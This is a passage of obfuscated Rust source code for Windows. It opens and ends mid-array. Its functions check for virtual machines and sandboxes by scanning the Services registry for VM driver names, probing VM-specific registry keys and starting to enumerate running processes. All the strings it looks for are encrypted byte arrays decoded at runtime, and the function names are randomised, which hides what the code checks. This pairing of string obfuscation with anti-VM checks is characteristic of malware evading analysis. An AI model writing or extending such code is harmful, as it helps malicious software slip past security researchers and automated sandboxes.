, 66 , 136 , 175 , 54 , 23 , 48 , 195 , 228 , 36 , 22 , 153 , 130 , 26 , 19 , 169 , 88 , 106 , 67 , 24 , 245 , 75 , 20 , 241 , 46 , 135 , 159 , 1 , 48 , 217 , 151 , 118 , 253 , 16 , 220 , 135 , 231 , 237 , 184 , 162 , 210 , 183 , 167 , 157 , 194 , 32 , 22 , 149 , 168 , 7 , 36 , 96 , 103 , 194 , 192 , 52 , 194 , 247 , 179 , 11 , 55 , 84 , 132 , 20 , 246 , 134 , 174 , 78 , 238 , 165 , 44 , 164] , 7344394076718u64) , decode_tk_smkebhmyyv (& [116 , 217 , 154 , 151 , 212 , 196 , 148 , 116 , 156 , 51 , 3 , 122 , 41 , 207 , 147 , 124 , 229 , 83 , 7 , 8 , 64 , 255 , 170 , 73 , 51 , 197 , 154 , 72 , 112 , 205 , 151 , 68 , 177 , 104 , 116 , 149 , 77 , 77 , 219 , 15 , 102 , 111 , 196 , 17 , 59 , 124 , 233 , 76 , 47 , 70 , 147 , 219 , 166 , 3 , 212 , 40 , 72 , 17 , 198 , 161 , 197 , 211 , 219 , 66 , 174 , 120 , 255 , 128 , 36 , 51 , 148 , 127 , 133 , 79 , 131 , 123 , 195 , 174 , 63 , 61] , & [31 , 139 , 194 , 96 , 204 , 142 , 226 , 130 , 231 , 137 , 131 , 236 , 149 , 147 , 23 , 64 , 12 , 93 , 11 , 223 , 198 , 93 , 86 , 33 , 134 , 182 , 100 , 250 , 100 , 179 , 93 , 194 , 87 , 181 , 112 , 136 , 208 , 30 , 6 , 162 , 231 , 245 , 113 , 219 , 35 , 9 , 211 , 162 , 186 , 143 , 43 , 173 , 2 , 47 , 98 , 253 , 126 , 120 , 26 , 229 , 244 , 137 , 160 , 250 , 124 , 123 , 177 , 172 , 34 , 109 , 6 , 56 , 236 , 252 , 202 , 75 , 150 , 200 , 35 , 108 , 161 , 236 , 169 , 69 , 43 , 132 , 180 , 134] , 6687264080330u64) ,] ; let mut i = 0 ; loop { let mut subkey_name_buffer : [u16 ; (122 + 134)] = [0 ; (68 + 188)] ; let mut subkey_name_len = subkey_name_buffer . len () as u32 ; if unsafe { RegEnumKeyExW (services_key_handle , i , PWSTR (subkey_name_buffer . as_mut_ptr ()) , & mut subkey_name_len , None , PWSTR (std :: ptr :: null_mut ()) , None , None ,) } . is_err () { break ; } i += 1 ; let subkey_name = String :: from_utf16_lossy (& subkey_name_buffer [.. subkey_name_len as usize]) ; let service_key_path = format ! ("SYSTEM\\CurrentControlSet\\Services\\{}" , subkey_name) ; let mut service_key_handle : HKEY = HKEY (0) ; let service_key_pcwstr = b_acilzxq (& service_key_path) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (service_key_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut service_key_handle ,) } . is_ok () { let value_name = b_acilzxq (& decode_tk_smkebhmyyv (& [138 , 33 , 210 , 98 , 168 , 52 , 56 , 89 , 20 , 110 , 180 , 106 , 134 , 26 , 149 , 87 , 160 , 52 , 206 , 3 , 248 , 39 , 136 , 108 , 230 , 252 , 181 , 177 , 253 , 230 , 92 , 210 , 84 , 152 , 155 , 255 , 65 , 217 , 213 , 208 , 17 , 192 , 11 , 234 , 125 , 82 , 199 , 230 , 141 , 176 , 18 , 31 , 125 , 50 , 157 , 150 , 184 , 200 , 237 , 132 , 138 , 153 , 39 , 176 , 241 , 17 , 120 , 121 , 102 , 12 , 63 , 254 , 108 , 239 , 249 , 39 , 212 , 249 , 66 , 246 , 250 , 127 , 110 , 64 , 253 , 23 , 74 , 107 , 185 , 55 , 50 , 254 , 134 , 171 , 234 , 230 , 124 , 60 , 230 , 184 , 189 , 229 , 134 , 241 , 146 , 80 , 238 , 182 , 194 , 227 , 251 , 61 , 51 , 172 , 152 , 148 , 158 , 212 , 38 , 6 , 13 , 92 , 66 , 154 , 227 , 228 , 95 , 117] , & [67 , 167 , 220 , 166 , 97 , 224 , 33 , 237 , 221 , 11 , 161 , 168 , 160 , 155 , 19 , 199 , 105 , 215 , 210 , 152 , 163 , 10 , 243 , 210 , 113 , 155 , 222 , 56 , 202 , 157 , 216 , 193 , 226 , 149 , 102 , 189 , 55 , 218 , 63 , 51 , 55 , 163 , 182 , 229 , 230 , 113 , 191 , 169 , 130 , 16 , 242 , 115 , 34 , 83 , 87 , 123 , 113 , 217 , 43 , 97 , 184 , 67 , 120 , 126 , 47 , 33 , 227 , 202 , 54 , 143 , 124 , 237 , 23 , 236 , 28 , 154 , 208 , 98 , 111 , 90 , 211 , 97 , 45 , 113 , 221 , 57 , 1 , 250] , 18412524798833u64)) ; let mut buffer : [u16 ; (117 + 139)] = [0 ; (72 + 184)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; if unsafe { RegQueryValueExW (service_key_handle , PCWSTR (value_name . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_driver in & vm_drivers { if value . contains (& * * vm_driver) { unsafe { let _ = RegCloseKey (service_key_handle) ; let _ = RegCloseKey (services_key_handle) ; } ; return true ; } } } unsafe { let _ = RegCloseKey (service_key_handle) ; } ; } } unsafe { let _ = RegCloseKey (services_key_handle) ; } ; false } fn b_acilzxq (s : & str) -> Vec < u16 > { OsStr :: new (s) . encode_wide () . chain (std :: iter :: once (0)) . collect () } pub fn check_vm_registry_keys () -> bool { let vm_keys = [decode_tk_smkebhmyyv (& [232 , 247 , 146 , 153 , 8 , 142 , 91 , 247 , 234 , 46 , 108 , 32 , 101 , 178 , 144 , 90 , 155 , 179 , 3 , 58 , 175 , 133 , 221 , 196 , 63 , 198 , 223 , 99 , 26 , 43 , 113 , 122 , 253 , 165 , 122 , 24 , 143 , 138 , 195 , 133 , 45 , 198 , 0 , 7 , 22 , 59 , 19 , 223 , 138 , 240 , 198 , 208 , 170 , 77 , 151 , 248 , 164 , 200 , 83 , 153 , 156 , 188 , 135 , 234 , 233 , 246 , 77 , 223 , 196 , 125 , 155 , 179 , 106 , 206 , 163 , 224 , 86 , 38 , 227 , 84 , 16 , 21 , 181 , 128 , 16 , 77 , 149 , 93 , 93 , 178 , 193 , 163 , 98 , 233 , 201 , 78 , 149 , 216 , 150 , 93 , 27 , 25 , 182 , 184 , 11 , 35 , 143 , 147 , 44 , 148 , 117 , 131 , 40 , 39 , 53 , 159 , 2 , 159 , 225 , 44 , 189 , 133 , 239 , 54 , 96 , 188 , 227 , 72 , 119 , 244 , 147 , 232 , 113 , 41 , 202 , 25 , 154 , 59 , 242 , 169 , 25 , 200 , 141 , 213 , 114 , 56 , 202 , 248 , 22 , 125 , 201 , 175 , 198 , 249 , 173 , 79 , 108 , 76 , 59 , 69 , 238 , 203 , 92 , 88 , 229 , 101 , 202 , 95 , 94 , 86 , 68 , 139 , 9 , 163 , 27 , 176 , 103 , 53 , 100 , 119 , 21 , 59 , 130 , 59 , 193 , 107 , 84 , 144 , 14 , 198 , 134 , 234 , 153 , 0 , 138 , 237 , 231 , 97 , 7 , 127 , 188 , 145 , 187 , 26 , 102 , 150 , 24 , 86 , 125 , 182 , 79 , 137 , 222 , 209 , 216 , 146 , 82 , 126 , 142 , 146 , 215 , 225 , 146 , 219 , 35 , 208 , 217 , 143 , 145 , 3 , 194 , 244 , 150 , 59 , 72 , 51 , 214 , 223 , 203 , 179 , 71 , 251 , 57 , 82 , 116 , 215 , 79 , 68 , 245 , 115 , 177 , 135 , 31 , 9 , 166 , 220 , 83 , 123 , 68 , 100 , 85 , 135 , 25 , 208 , 53 , 161 , 34 , 44 , 242 , 128 , 145 , 77 , 147 , 191 , 33 , 41 , 35 , 100 , 123 , 210 , 131 , 113 , 80 , 144 , 110 , 109 , 243 , 107 , 32 , 239 , 48 , 62 , 54 , 227 , 11 , 32 , 174 , 138 , 225 , 28 , 254 , 246 , 138 , 144 , 52 , 67 , 143 , 40 , 99 , 117 , 48 , 243 , 179 , 67 , 164 , 163 , 202 , 101 , 198 , 245 , 107 , 113 , 217 , 79 , 177 , 250 , 25 , 182 , 91 , 128 , 177 , 114 , 17 , 209 , 74 , 29 , 226 , 249 , 30 , 160 , 245 , 144 , 128 , 82 , 148 , 113 , 76 , 75 , 217 , 148 , 204 , 177 , 127 , 68 , 212 , 142 , 250 , 208 , 204 , 95 , 159 , 188 , 116 , 235 , 77 , 100 , 239 , 50 , 126 , 204 , 97 , 207 , 117 , 208 , 246 , 87 , 45 , 244 , 181 , 103 , 128 , 195 , 159 , 247 , 126 , 49 , 204 , 54 , 255 , 212 , 161 , 232 , 145 , 183 , 203 , 59 , 35 , 155 , 180 , 222] , & [155 , 215 , 115 , 38 , 119 , 50 , 175 , 9 , 221 , 197 , 217 , 108 , 24 , 42 , 15 , 59 , 108 , 76 , 46 , 131 , 50 , 76 , 117 , 79 , 30 , 233 , 96 , 72 , 70 , 120 , 23 , 141 , 103 , 204 , 112 , 161 , 143 , 200 , 31 , 87 , 134 , 137 , 33 , 60 , 143 , 134 , 59 , 6 , 14 , 214 , 88 , 237 , 55 , 1 , 180 , 169 , 241 , 192 , 70 , 159 , 212 , 76 , 220 , 249 , 137 , 126 , 208 , 217 , 113 , 193 , 126 , 173 , 174 , 132 , 150 , 86 , 192 , 186 , 152 , 77 , 39 , 118 , 14 , 217 , 118 , 193 , 152 , 62] , 213266601085837u64) , decode_tk_smkebhmyyv (& [107 , 191 , 21 , 221 , 240 , 249 , 77 , 209 , 97 , 240 , 94 , 197 , 28 , 22 , 186 , 12 , 22 , 10 , 69 , 27 , 164 , 18 , 98 , 156 , 160 , 88 , 40 , 197 , 202 , 214 , 233 , 241 , 147 , 57 , 129 , 82 , 30 , 114 , 178 , 104 , 56 , 228 , 79 , 205 , 128 , 113 , 75 , 181 , 23 , 98 , 81 , 157 , 237 , 97 , 45 , 242 , 113 , 230 , 83 , 248 , 167 , 23 , 16 , 254 , 78 , 112 , 157 , 228 , 42 , 51 , 48 , 192 , 28 , 165 , 160 , 242 , 190 , 81 , 94 , 232 , 21 , 79 , 105 , 80 , 82 , 255 , 129 , 14 , 202 , 13 , 233 , 110 , 125 , 155 , 35 , 56 , 56 , 102 , 130 , 230 , 97 , 4 , 10 , 71 , 26 , 61 , 47 , 207 , 102 , 26 , 226 , 94 , 185 , 23 , 166 , 193 , 75 , 63 , 167 , 161 , 171 , 145 , 174 , 161 , 75 , 25 , 175 , 39 , 182 , 192 , 218 , 97 , 7 , 171 , 20 , 123 , 210 , 191 , 193 , 224 , 252 , 118 , 8 , 210 , 51 , 172 , 166 , 175 , 162 , 185 , 180 , 168 , 223 , 213 , 103 , 21 , 121 , 86 , 75 , 119 , 175 , 171 , 52 , 194 , 63 , 122 , 176 , 224 , 110 , 214 , 129 , 44 , 171 , 180 , 128 , 178 , 104 , 80 , 237 , 72 , 194 , 197 , 158 , 205 , 139 , 249 , 121 , 72 , 195 , 57 , 91 , 130 , 97 , 98 , 64 , 137 , 208 , 97 , 84 , 19 , 109 , 217 , 197 , 80 , 134 , 67 , 0 , 224 , 142 , 137 , 87 , 117 , 45 , 229 , 103 , 206 , 182 , 159 , 81 , 235 , 53 , 176 , 222 , 200 , 116 , 137 , 160 , 55 , 231 , 102 , 113 , 143 , 217 , 133 , 223 , 194 , 242 , 11 , 17 , 110 , 168 , 102 , 14 , 218 , 159 , 163 , 147 , 116 , 186 , 67 , 99 , 15 , 44 , 94 , 66 , 28 , 237 , 202 , 108 , 150 , 141 , 112 , 160 , 125 , 226 , 105 , 188 , 164 , 115 , 105 , 12 , 240 , 39 , 196 , 199 , 26 , 34 , 209 , 187 , 50 , 44 , 154 , 103 , 146 , 179 , 237 , 225 , 105 , 49 , 113 , 78 , 37 , 194 , 119 , 197 , 167 , 230 , 113 , 36 , 57 , 45 , 240 , 81 , 64 , 175 , 17 , 230 , 118 , 17 , 181 , 3 , 101 , 35 , 29 , 243 , 96 , 211 , 209 , 246 , 220 , 113 , 224 , 88 , 120 , 223 , 12 , 162 , 28 , 228 , 191 , 87 , 127 , 162 , 13 , 104 , 149 , 11 , 137 , 40 , 4 , 180 , 94 , 202 , 137 , 170 , 62 , 49 , 138 , 110 , 209 , 87 , 82 , 231 , 122 , 14 , 33 , 138 , 136 , 134 , 83 , 16 , 52 , 212 , 210 , 163 , 37 , 127 , 6 , 248 , 78 , 8 , 53 , 211 , 105 , 70 , 39 , 227 , 37 , 154 , 213 , 167 , 140 , 142 , 78 , 48 , 240 , 87 , 104 , 58 , 21 , 86 , 245 , 24 , 198 , 15 , 65 , 151 , 120 , 41 , 15 , 218 , 247 , 125 , 10 , 1 , 61 , 106 , 67 , 41 , 21 , 129 , 241 , 31 , 119 , 110 , 207 , 72 , 232 , 107 , 177 , 64 , 227 , 171 , 8 , 54 , 155 , 146 , 131 , 143 , 236 , 64 , 8 , 84 , 142 , 143 , 253 , 25 , 14 , 110 , 219 , 173 , 126 , 217 , 144 , 14 , 199 , 2 , 190 , 92 , 104 , 65 , 111 , 11 , 207 , 126 , 192 , 60 , 197 , 32 , 187 , 88 , 74 , 115 , 135 , 160 , 164 , 130 , 13 , 51 , 27 , 13 , 39 , 21 , 77 , 246 , 113 , 245 , 148 , 166 , 39 , 141 , 200 , 38 , 102 , 25 , 199 , 159 , 23 , 209 , 245 , 197 , 23 , 207 , 57 , 155 , 88 , 91 , 46 , 134 , 195 , 135 , 201 , 130 , 231 , 18 , 199 , 24 , 246 , 95 , 205 , 95 , 245] , & [79 , 196 , 183 , 93 , 45 , 7 , 213 , 247 , 62 , 167 , 201 , 193 , 166 , 221 , 30 , 158 , 20 , 167 , 9 , 251 , 56 , 247 , 90 , 204 , 84 , 230 , 37 , 160 , 112 , 7 , 177 , 22 , 220 , 35 , 63 , 80 , 197 , 123 , 215 , 244 , 213 , 255 , 152 , 88 , 159 , 122 , 18 , 74 , 79 , 141 , 196 , 88 , 162 , 41 , 22 , 73 , 218 , 97 , 9 , 247 , 27 , 255 , 237 , 125 , 33 , 242 , 1 , 61 , 101 , 36 , 68 , 69 , 246 , 110 , 98 , 21 , 224 , 182 , 10 , 37 , 249 , 77 , 77 , 35 , 116 , 122 , 247 , 180] , 112356344467637u64) , decode_tk_smkebhmyyv (& [241 , 201 , 232 , 212 , 57 , 53 , 4 , 234 , 85 , 67 , 216 , 149 , 139 , 183 , 230 , 139 , 165 , 27 , 150 , 255 , 112 , 236 , 20 , 5 , 105 , 59 , 134 , 51 , 118 , 36 , 71 , 38 , 155 , 233 , 58 , 174 , 66 , 85 , 80 , 173 , 212 , 99 , 120 , 65 , 222 , 55 , 183 , 191 , 21 , 211 , 175 , 45 , 76 , 173 , 220 , 254 , 41 , 228 , 240 , 18 , 128 , 133 , 141 , 162 , 78 , 116 , 156 , 8 , 111 , 7 , 244 , 145 , 187 , 250 , 15 , 2 , 182 , 145 , 149 , 73 , 84 , 56 , 8 , 14 , 1 , 83 , 238 , 186 , 133 , 205 , 206 , 4 , 218 , 115 , 31 , 94 , 75 , 139 , 202 , 129 , 52 , 157 , 120 , 168 , 66 , 197 , 125 , 213 , 188 , 126 , 195 , 156 , 146 , 216 , 211 , 233 , 245 , 44 , 110 , 188 , 228 , 208 , 15 , 188 , 67 , 146 , 155 , 249 , 218 , 107 , 184 , 183 , 206 , 23 , 99 , 149 , 94 , 239 , 237 , 91 , 156 , 194 , 246 , 145 , 69 , 238 , 208 , 47 , 229 , 119 , 209 , 133 , 117 , 24 , 20 , 56 , 246 , 126 , 35 , 24 , 48 , 167 , 34 , 170 , 63 , 244 , 71 , 96 , 254 , 137 , 237 , 58 , 125 , 204 , 64 , 82 , 252 , 114 , 188 , 145 , 44 , 86 , 169 , 142 , 74 , 243 , 249 , 111 , 128 , 29 , 234 , 119 , 49 , 112 , 90 , 11 , 44 , 40 , 254 , 160 , 89 , 210 , 253 , 61 , 225 , 231 , 235 , 231 , 54 , 35 , 145 , 20 , 76 , 49 , 165 , 204 , 251 , 212 , 26 , 152 , 146 , 246 , 6 , 126 , 75 , 31 , 115 , 103 , 161 , 153 , 2 , 182 , 101 , 247 , 206 , 98 , 241 , 169 , 132 , 8 , 145 , 122 , 198 , 91 , 193 , 193 , 113 , 50 , 248 , 60 , 225 , 28 , 190 , 66 , 118 , 82 , 90 , 48 , 210 , 112 , 12 , 4 , 206 , 96 , 56 , 112 , 79 , 128 , 112 , 97 , 245 , 99 , 170 , 208 , 189 , 9 , 112 , 240 , 126 , 4 , 67 , 30 , 207 , 174 , 171 , 89 , 116 , 117 , 208 , 215 , 49 , 73 , 152 , 82 , 145 , 51 , 43 , 65 , 247 , 231 , 247 , 196 , 38 , 5 , 228 , 245 , 108 , 131 , 76 , 168 , 170 , 71 , 184 , 46 , 232 , 183 , 57 , 69 , 242 , 142 , 141 , 60 , 63 , 29 , 172 , 152 , 159 , 94 , 24 , 233 , 121 , 66 , 127 , 141 , 236 , 69 , 165 , 17 , 63 , 131 , 125 , 109 , 72 , 245 , 67 , 89 , 81 , 145 , 152 , 174 , 60 , 148 , 225 , 41 , 70 , 33 , 111 , 20 , 193 , 207 , 88 , 76 , 181 , 192 , 180 , 213 , 166 , 174 , 253 , 41 , 1 , 31 , 245 , 250 , 81 , 159 , 116 , 0 , 167 , 183 , 254 , 163 , 15 , 235 , 207 , 153 , 14 , 84 , 199 , 29 , 224 , 100 , 109 , 77 , 146 , 204 , 91 , 173 , 55 , 40 , 228 , 160 , 56 , 163 , 11 , 114 , 248 , 200 , 95 , 156 , 0 , 30 , 255 , 161 , 23 , 166 , 171 , 183 , 25 , 112 , 124 , 252 , 19 , 16 , 86 , 154 , 219 , 1 , 19 , 23 , 19 , 37 , 71 , 171 , 203 , 113 , 66 , 182 , 49 , 131 , 179 , 186 , 42 , 113 , 184 , 184 , 32 , 23 , 113 , 252 , 215 , 33 , 129 , 172 , 83 , 199 , 224 , 84 , 59 , 93 , 28 , 82 , 191 , 70 , 200 , 73 , 159 , 189 , 31 , 207 , 209 , 2 , 0 , 27 , 162 , 201 , 110 , 210 , 49 , 51 , 223 , 49 , 199 , 84 , 86 , 30 , 67 , 198 , 240 , 130 , 243 , 189 , 218 , 107 , 9 , 108 , 191 , 109 , 131 , 94 , 129 , 128 , 144 , 237 , 75 , 201 , 142 , 234 , 156 , 87 , 180 , 20] , & [198 , 159 , 11 , 13 , 7 , 11 , 199 , 12 , 23 , 218 , 188 , 247 , 177 , 229 , 45 , 147 , 25 , 2 , 64 , 130 , 16 , 180 , 216 , 176 , 1 , 168 , 36 , 40 , 204 , 224 , 187 , 15 , 177 , 240 , 121 , 47 , 47 , 18 , 96 , 109 , 146 , 244 , 115 , 128 , 224 , 23 , 71 , 21 , 170 , 87 , 120 , 40 , 107 , 96 , 57 , 187 , 2 , 95 , 16 , 149 , 167 , 26 , 95 , 80 , 0 , 50 , 58 , 167 , 13 , 97 , 125 , 25 , 226 , 102 , 37 , 31 , 16 , 238 , 29 , 51 , 27 , 213 , 150 , 68 , 229 , 34 , 240 , 115] , 112523848192182u64) , decode_tk_smkebhmyyv (& [8 , 176 , 170 , 1 , 1 , 139 , 221 , 218 , 83 , 13 , 212 , 33 , 117 , 200 , 197 , 16 , 58 , 5 , 93 , 145 , 243 , 187 , 228 , 132 , 186 , 55 , 60 , 47 , 162 , 252 , 11 , 64 , 103 , 208 , 218 , 183 , 124 , 160 , 247 , 103 , 219 , 10 , 159 , 22 , 133 , 203 , 92 , 112 , 3 , 254 , 136 , 5 , 29 , 208 , 31 , 147 , 68 , 191 , 8 , 150 , 136 , 127 , 190 , 176 , 179 , 110 , 114 , 3 , 97 , 177 , 71 , 106 , 115 , 247 , 24 , 211 , 182 , 167 , 154 , 193 , 243 , 157 , 93 , 136 , 43 , 92 , 253 , 245 , 158 , 100 , 212 , 112 , 127 , 11 , 218 , 33 , 18 , 104 , 150 , 117 , 152 , 184 , 61 , 252 , 238 , 117 , 183 , 190 , 23 , 74 , 137 , 133 , 96 , 212 , 243 , 220 , 122 , 254 , 166 , 251 , 62 , 234 , 141 , 201 , 190 , 6 , 50 , 91 , 166 , 123 , 181 , 2 , 186 , 117 , 9 , 100 , 232 , 246 , 171 , 147 , 26 , 19 , 135 , 82 , 245 , 174 , 26 , 154 , 118 , 162 , 58 , 41 , 22 , 104 , 101 , 139 , 57 , 158 , 47 , 28 , 25 , 169 , 157 , 245 , 225 , 127 , 124 , 39 , 240 , 176 , 234 , 93 , 222 , 206 , 181 , 35 , 203 , 219 , 187 , 3 , 136 , 61 , 184 , 184 , 141 , 33 , 129 , 233 , 121 , 173 , 21 , 97 , 135 , 255 , 224 , 210 , 132 , 192 , 165 , 181 , 4 , 143 , 205 , 255 , 249 , 216 , 5 , 232 , 184 , 233 , 153 , 144 , 88 , 162 , 41 , 210 , 229 , 230 , 54 , 131 , 36 , 183 , 155 , 62 , 151 , 182 , 111 , 125 , 222 , 193 , 153 , 231 , 197 , 154 , 41 , 152 , 5 , 60 , 94 , 223 , 158 , 86 , 143 , 25 , 169 , 199 , 232 , 178 , 197 , 160 , 125 , 194 , 43 , 96 , 111 , 74 , 216 , 204 , 229 , 119 , 166 , 110 , 75 , 171 , 72 , 232 , 170 , 144 , 126 , 172 , 226 , 176 , 95 , 156 , 192 , 239 , 177 , 88 , 18 , 219 , 239 , 29 , 150 , 80 , 25 , 215 , 106 , 204 , 155 , 53 , 36 , 231 , 116 , 214 , 86 , 113 , 131 , 149 , 55 , 137 , 129 , 21 , 156 , 218 , 42 , 120 , 148 , 169 , 197 , 165 , 180 , 189 , 215 , 47 , 111 , 115 , 176 , 103 , 143 , 128 , 254 , 217 , 205 , 152 , 160 , 45 , 236 , 232 , 221 , 171 , 17 , 35 , 237 , 170 , 27 , 27 , 163 , 43 , 61 , 1 , 161 , 216 , 88 , 89 , 114 , 195 , 101 , 5 , 27 , 171 , 44 , 102 , 44 , 60 , 119 , 197 , 208 , 14 , 27 , 232 , 144 , 162 , 175 , 204 , 87 , 56 , 194 , 36 , 22 , 24 , 104 , 213 , 225 , 120 , 22 , 127 , 38 , 129 , 102 , 80 , 172 , 248 , 238 , 112 , 130 , 95 , 114 , 247 , 249 , 189 , 24 , 79 , 5 , 239 , 138 , 7 , 225 , 128 , 73 , 77 , 246 , 181 , 114 , 175 , 242 , 254 , 199 , 249 , 144 , 98 , 118 , 162 , 105 , 190 , 70 , 84 , 102 , 140 , 74 , 7 , 89 , 146 , 81 , 164 , 91 , 249 , 53 , 109 , 45 , 31 , 165 , 101 , 139 , 93 , 172 , 94 , 137 , 28 , 30 , 186 , 55 , 248 , 249 , 138 , 90 , 106 , 5 , 154 , 222 , 102 , 111 , 40 , 111 , 204 , 211 , 222 , 56 , 79 , 74 , 68 , 109 , 66 , 232 , 158] , & [10 , 130 , 32 , 109 , 210 , 235 , 1 , 165 , 115 , 145 , 181 , 137 , 53 , 156 , 8 , 20 , 196 , 29 , 222 , 44 , 60 , 100 , 103 , 243 , 31 , 88 , 140 , 201 , 81 , 139 , 35 , 49 , 227 , 206 , 111 , 215 , 211 , 253 , 135 , 38 , 0 , 234 , 110 , 187 , 123 , 223 , 39 , 238 , 87 , 179 , 218 , 115 , 99 , 137 , 245 , 166 , 119 , 142 , 5 , 142 , 254 , 161 , 217 , 143 , 110 , 205 , 171 , 149 , 157 , 14 , 48 , 120 , 122 , 249 , 213 , 240 , 68 , 23 , 89 , 142 , 69 , 155 , 58 , 188 , 166 , 44 , 158 , 86] , 58639188496198u64) , decode_tk_smkebhmyyv (& [91 , 250 , 11 , 179 , 123 , 99 , 71 , 156 , 251 , 81 , 158 , 63 , 201 , 83 , 120 , 146 , 65 , 250 , 212 , 161 , 67 , 84 , 2 , 25 , 190 , 243 , 239 , 123 , 47 , 20 , 234 , 36 , 220 , 73 , 112 , 23 , 78 , 233 , 135 , 23 , 92 , 83 , 47 , 171 , 175 , 225 , 2 , 171 , 204 , 136 , 185 , 46 , 187 , 113 , 204 , 245 , 246 , 87 , 233 , 187 , 4 , 217 , 46 , 158 , 70 , 121 , 5 , 166 , 43 , 227 , 77 , 183 , 27 , 121 , 125 , 191 , 56 , 118 , 125 , 177 , 85 , 146 , 163 , 244 , 181 , 17 , 203 , 64 , 61 , 3 , 90 , 172 , 146 , 95 , 153 , 101 , 117 , 20 , 189 , 130 , 118 , 214 , 203 , 46 , 54 , 3 , 9 , 219 , 102 , 198 , 177 , 27 , 232 , 145 , 191 , 245 , 237 , 209 , 70 , 61 , 21 , 159 , 52 , 156 , 51 , 128 , 72 , 79 , 123 , 7 , 233 , 155 , 82 , 5 , 45 , 78 , 92 , 81 , 61 , 32 , 130 , 57 , 44 , 118 , 226 , 46 , 117 , 248 , 109 , 178 , 44 , 182 , 186 , 244 , 200 , 104 , 220 , 48 , 199 , 55 , 174 , 50 , 0 , 136 , 247 , 34 , 130 , 115 , 96 , 171 , 148 , 95 , 244 , 78 , 207 , 227 , 251 , 167 , 130 , 252 , 31 , 166 , 191 , 5 , 85 , 246 , 136 , 254 , 95 , 136 , 112 , 91 , 241 , 129 , 105 , 174 , 58 , 73 , 154 , 137 , 78 , 222 , 38 , 137 , 115 , 46 , 69 , 215 , 213 , 200 , 223 , 203 , 32 , 106 , 81 , 176 , 141 , 150 , 160 , 180 , 178 , 34 , 46 , 129 , 59 , 103 , 64 , 30 , 2 , 193 , 74 , 25 , 108 , 188 , 36 , 204 , 2 , 102 , 195 , 92 , 229 , 40 , 28 , 70 , 59 , 237 , 158 , 215 , 193 , 104 , 85 , 72 , 171 , 13 , 16 , 46 , 158 , 54 , 6 , 254 , 158 , 77 , 159 , 201 , 74 , 130 , 201 , 9 , 192 , 113 , 116 , 243 , 76 , 155 , 61 , 151 , 247 , 195 , 242 , 175 , 9 , 150 , 3 , 221 , 31 , 235 , 130 , 109 , 83 , 45 , 145 , 147 , 152 , 219 , 192 , 244 , 69 , 176 , 114 , 110 , 188 , 83 , 37 , 231 , 142 , 247 , 70 , 36 , 91 , 209 , 111 , 159 , 83 , 169 , 46 , 158 , 66 , 96 , 140 , 103 , 196 , 190 , 70 , 146 , 99 , 111 , 144 , 197 , 153 , 154 , 50 , 86 , 202 , 205 , 192 , 135 , 54 , 117 , 239 , 119 , 43 , 87 , 254 , 58 , 130 , 76 , 62 , 127 , 74 , 0 , 97 , 172 , 189 , 231 , 1 , 6 , 222 , 86 , 19 , 145 , 215 , 100 , 83 , 178 , 246 , 245 , 191 , 203 , 160 , 17 , 94 , 77 , 93 , 216 , 44 , 254 , 219 , 242 , 168 , 134 , 73 , 5 , 245 , 12 , 82 , 210 , 22 , 121 , 244 , 238 , 255 , 231 , 236 , 230 , 22 , 42 , 184 , 193 , 214 , 13 , 180 , 176 , 198 , 186 , 143 , 126 , 6 , 154 , 188 , 125 , 238 , 235 , 198 , 107 , 124 , 178 , 228 , 227 , 77 , 189 , 79 , 83 , 56 , 120 , 100 , 93 , 94 , 162 , 148 , 216 , 71 , 164 , 32 , 191 , 91 , 210 , 74 , 87 , 134 , 222 , 165 , 183 , 125 , 65 , 67 , 96 , 9 , 173 , 22 , 214 , 174 , 47 , 246 , 57 , 88 , 146 , 73 , 201 , 202 , 239 , 202 , 236 , 45 , 240 , 199 , 132 , 175 , 149 , 23 , 83 , 6 , 35 , 96 , 204 , 98 , 29 , 161 , 14 , 2 , 114 , 123 , 148 , 119 , 115 , 202 , 200 , 29 , 90 , 102 , 170 , 217 , 116 , 5 , 220 , 120 , 79 , 207 , 33 , 36 , 4 , 119 , 217 , 179 , 211 , 8 , 108 , 65 , 68 , 141 , 71 , 191 , 71] , & [32 , 145 , 249 , 79 , 204 , 135 , 25 , 53 , 97 , 21 , 210 , 156 , 219 , 231 , 233 , 176 , 233 , 80 , 2 , 91 , 244 , 84 , 166 , 134 , 160 , 35 , 127 , 41 , 96 , 60 , 10 , 238 , 204 , 111 , 171 , 103 , 180 , 122 , 120 , 80 , 148 , 113 , 154 , 43 , 231 , 230 , 228 , 215 , 197 , 130 , 116 , 89 , 76 , 62 , 42 , 56 , 3 , 134 , 137 , 100 , 28 , 251 , 158 , 89 , 29 , 146 , 128 , 178 , 143 , 105 , 36 , 154 , 197 , 214 , 70 , 134 , 188 , 211 , 178 , 210 , 205 , 24 , 253 , 79 , 33 , 180 , 25 , 231] , 112317689761956u64) ,] ; for key_path in & vm_keys { let subkey_pcwstr = b_acilzxq (& * * key_path) ; let mut key_handle : HKEY = HKEY (0) ; let result = unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (subkey_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut key_handle ,) } ; if result . is_ok () { unsafe { let _ = RegCloseKey (key_handle) ; } ; return true ; } } false } pub fn check_vm_processes () -> bool { let snapshot_handle = match unsafe { CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS , 0) } { Ok (handle) => handle , Err (_) => return false , } ; if snapshot_handle . is_invalid () { return false ; } let mut process_entry : PROCESSENTRY32W = unsafe { std :: mem :: zeroed () } ; process_entry . dwSize = std :: mem :: size_of :: < PROCESSENTRY32W > () as u32 ; if unsafe { Process32FirstW (snapshot_handle , & mut process_entry) } . is_err () { unsafe { let _ = CloseHandle (snapshot_handle) ; } ; return false ; } let vm_processes = [decode_tk_smkebhmyyv (& [189 , 21 , 255 , 175 , 44 , 35 , 135 , 189 , 143 , 47 , 190 , 97 , 177 , 80 , 33 , 186 , 235 , 105 , 77 , 160 , 139 , 134 , 138 , 156 , 140 , 72 , 249 , 46 , 242 , 173 , 158 , 134 , 17 , 63 , 214 , 97 , 30 , 104 , 49 , 163 , 247 , 192 , 160 , 252 , 50 , 77 , 8 , 126 , 91 , 166 , 100 , 182 , 94 , 75 , 199 , 143 , 253 